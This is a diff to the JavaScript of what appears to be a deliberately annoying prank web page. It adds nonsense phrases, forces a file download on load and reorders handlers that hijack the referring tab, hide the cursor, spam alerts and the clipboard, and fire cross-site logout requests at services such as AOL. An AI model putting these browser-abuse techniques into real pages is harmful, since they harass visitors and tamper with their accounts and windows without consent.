@@ -93,6 +93,17 @@ const FILE_DOWNLOADS = [
   'patreon.png'
 ]
 
+const PHRASES = [
+  'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
+  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
+  'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
+  'I\'ve never seen the inside of my own mouth because it scares me to death.',
+  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
+  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
+  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
+  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
+]
+
 const LOGOUT_SITES = {
   'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
   'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
@@ -192,6 +203,7 @@ function init () {
 
     startVibrateInterval()
     enablePictureInPicture()
+    triggerFileDownload()
 
     focusWindows()
     copySpamToClipboard()
@@ -225,7 +237,9 @@ function initChildWindow () {
   speak()
 
   interceptUserInput(event => {
-    triggerFileDownload()
+    if (interactionCount === 1) {
+      startAlertInterval()
+    }
   })
 }
 
@@ -239,15 +253,14 @@ function initParentWindow () {
   startInvisiblePictureInPictureVideo()
 
   interceptUserInput(event => {
-    triggerFileDownload()
-
+    // Only run these on the first interaction
     if (interactionCount === 1) {
       attemptToTakeoverReferrerWindow()
       hideCursor()
+      startVideo()
       startAlertInterval()
       superLogout()
       removeHelloMessage()
-      startVideo()
     }
   })
 }
